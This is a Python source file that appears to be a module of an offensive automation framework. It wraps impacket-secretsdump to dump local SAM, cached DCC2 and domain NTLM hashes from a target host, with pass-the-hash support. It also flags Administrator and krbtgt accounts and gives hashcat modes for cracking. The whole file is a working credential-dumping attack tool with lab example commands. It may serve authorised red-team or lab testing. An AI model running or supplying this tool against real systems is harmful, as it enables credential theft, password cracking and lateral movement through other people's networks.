import re
import subprocess
import time

TOOL_BINARY = "impacket-secretsdump"   # apt: impacket-secretsdump  pip: secretsdump.py

TECHNIQUE_ID   = "T1003.002"
TECHNIQUE_NAME = "SAM/LSA Credential Dumping"

# Regex for the canonical NTLM hash line format: name:RID:LMhash:NThash:::
# Handles both "username" and "DOMAIN\username" formats.
NTLM_LINE_RE = re.compile(
    r"^(?:(?P<domain>[A-Za-z0-9._-]+)\\)?(?P<name>[^:]+)"
    r":(?P<rid>\d+)"
    r":(?P<lm>[a-fA-F0-9]{32})"
    r":(?P<nt>[a-fA-F0-9]{32}):::$"
)

# The "empty" LM hash — almost always present (LM disabled by default in modern Windows)
EMPTY_LM = "aad3b435b51404eeaad3b435b51404ee"


def run_secrets_dump(domain, username, target_ip, password=None, hashes=None, timeout=120):
    start = time.monotonic()

    # impacket format for secretsdump: "domain/user:pass@target"
    # Note the @target at the end — different from GetUserSPNs which uses -dc-ip
    creds = f"{domain}/{username}"
    if password and not hashes:
        creds += f":{password}"
    full_target = f"{creds}@{target_ip}"

    cmd = [TOOL_BINARY, full_target]
    if hashes:
        cmd += ["-hashes", hashes]

    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
            check=False,
        )
    except subprocess.TimeoutExpired as e:
        return _error(
            f"timed out after {timeout}s — target unreachable or SMB blocked?",
            stderr=e.stderr or "",
            duration=time.monotonic() - start,
        )
    except FileNotFoundError:
        return _error(
            f"{TOOL_BINARY!r} not found on PATH. "
            "Install: apt install python3-impacket  OR  pip install impacket",
            duration=time.monotonic() - start,
        )

    try:
        parsed = _parse(result.stdout, result.stderr, result.returncode)

        if parsed["access_denied"] or parsed["auth_failed"]:
            reason = "access denied — need local admin on target" \
                     if parsed["access_denied"] else \
                     "authentication failed — check credentials"
            return _error(reason, stderr=result.stderr, duration=time.monotonic() - start)

        return {
            "technique_id": TECHNIQUE_ID,
            "technique_name": TECHNIQUE_NAME,
            "tool": "secrets_dump",
            "status": "success",
            "summary": _summary(parsed, target_ip),
            "data": parsed,
            "error": None,
            "raw_stderr_tail": None,
            "duration_seconds": round(time.monotonic() - start, 2),
        }
    except Exception as e:
        return _error(
            f"unexpected parse error: {e}",
            stderr=result.stderr,
            duration=time.monotonic() - start,
        )


# ─── Internal helpers ──────────────────────────────────────────────────────────

def _parse(stdout, stderr, returncode):
    
    sam_hashes = []       # local account NTLM hashes
    domain_hashes = []    # domain account NTLM hashes (only if target is DC)
    cached_creds = []     # $DCC2$ cached domain logon hashes

    current_section = None

    for line in stdout.splitlines():
        stripped = line.strip()

        # Section markers
        if "[*] Dumping local SAM" in stripped:
            current_section = "sam"
            continue
        elif "[*] Dumping cached domain" in stripped:
            current_section = "cached"
            continue
        elif "[*] Dumping Domain Credentials" in stripped or \
             "[*] Using the DRSUAPI" in stripped:
            current_section = "domain"
            continue
        elif stripped.startswith("[*]") or stripped.startswith("[+]"):
            # Other info lines — not credential lines
            continue

        # Cached domain credentials ($DCC2$ format)
        if current_section == "cached" and stripped.startswith(r"$DCC2$") or \
           (current_section == "cached" and "/" in stripped and "#" in stripped):
            # Format: domain/username:$DCC2$10240#username#hash
            m = re.match(r"([^/]+)/([^:]+):\$DCC2\$\d+#[^#]+#(.+)$", stripped)
            if m:
                cached_creds.append({
                    "domain": m.group(1),
                    "username": m.group(2),
                    "hash": stripped,
                    "note": "DCC2 — slow to crack, hashcat mode 2100",
                })
            continue

        # NTLM hash lines (SAM or domain)
        m = NTLM_LINE_RE.match(stripped)
        if m:
            entry = {
                "username": m.group("name"),
                "domain": m.group("domain"),
                "rid": int(m.group("rid")),
                "lm_hash": m.group("lm"),
                "nt_hash": m.group("nt"),
                "is_machine_account": m.group("name", ).endswith("$"),
                "hashcat_mode": 1000,  # NT hash cracking
            }
            if current_section == "sam":
                sam_hashes.append(entry)
            elif current_section == "domain":
                domain_hashes.append(entry)

    # Failure signals
    combined = (stdout + " " + (stderr or "")).lower()
    access_denied = any(
        s in combined for s in [
            "rpc_s_access_denied",
            "access_denied",
            "status_access_denied",
            "error 5",
        ]
    )
    auth_failed = any(
        s in combined for s in [
            "status_logon_failure",
            "wrong password",
            "invalid credentials",
        ]
    )

    # Spotlight: Administrator (RID 500) and krbtgt (RID 502)
    high_value = [
        h for h in sam_hashes + domain_hashes
        if h["rid"] in (500, 502) or "administrator" in h["username"].lower()
    ]

    return {
        "sam_hash_count": len(sam_hashes),
        "sam_hashes": sam_hashes,
        "domain_hash_count": len(domain_hashes),
        "domain_hashes": domain_hashes,
        "cached_cred_count": len(cached_creds),
        "cached_creds": cached_creds,
        "high_value_accounts": high_value,
        "access_denied": access_denied,
        "auth_failed": auth_failed,
        "exit_code": returncode,
    }


def _summary(p, target_ip):
    total = p["sam_hash_count"] + p["domain_hash_count"]
    hv = [h["username"] for h in p["high_value_accounts"]]
    hv_str = f" High-value: {', '.join(hv)}." if hv else ""
    cached_str = (
        f" {p['cached_cred_count']} cached domain cred(s) (DCC2)." if p["cached_cred_count"] else ""
    )
    return (
        f"Dumped {total} NTLM hash(es) from {target_ip} "
        f"({p['sam_hash_count']} local SAM, {p['domain_hash_count']} domain).{hv_str}{cached_str} "
        f"Crack NT hashes with hashcat mode 1000."
    )


def _error(reason, stdout="", stderr="", duration=None):
    return {
        "technique_id": TECHNIQUE_ID,
        "technique_name": TECHNIQUE_NAME,
        "tool": "secrets_dump",
        "status": "timeout" if "timed out" in reason else "error",
        "summary": f"SecretsDump failed: {reason}",
        "data": None,
        "error": reason,
        "raw_stderr_tail": (stderr or "")[-500:] or None,
        "duration_seconds": round(duration, 2) if duration is not None else None,
    }


# ─── Terminal smoke-test ───────────────────────────────────────────────────────
# python3 secrets_dump.py lab.local administrator 10.0.0.10 -p Password123
# python3 secrets_dump.py lab.local administrator 10.0.0.10 --hashes ':NThash'

if __name__ == "__main__":
    import argparse, json

    ap = argparse.ArgumentParser(
        description="SecretsDump wrapper — manual test harness",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 secrets_dump.py lab.local administrator 10.0.0.10 -p Password123
  python3 secrets_dump.py lab.local administrator 10.0.0.10 --hashes ':8846f7eaee8fb117ad06bdd830b7586c'
  python3 secrets_dump.py lab.local lowprivuser 10.0.0.10 -p Password123   # test access denied
        """,
    )
    ap.add_argument("domain",    help="Domain name, e.g. lab.local")
    ap.add_argument("username",  help="Username with local admin on target")
    ap.add_argument("target_ip", help="Target machine IP")
    ap.add_argument("-p", "--password", default=None)
    ap.add_argument("--hashes",  default=None, help="LMhash:NThash for PtH")
    ap.add_argument("--timeout", type=int, default=120)
    args = ap.parse_args()

    result = run_secrets_dump(
        domain=args.domain,
        username=args.username,
        target_ip=args.target_ip,
        password=args.password,
        hashes=args.hashes,
        timeout=args.timeout,
    )
    print(json.dumps(result, indent=2))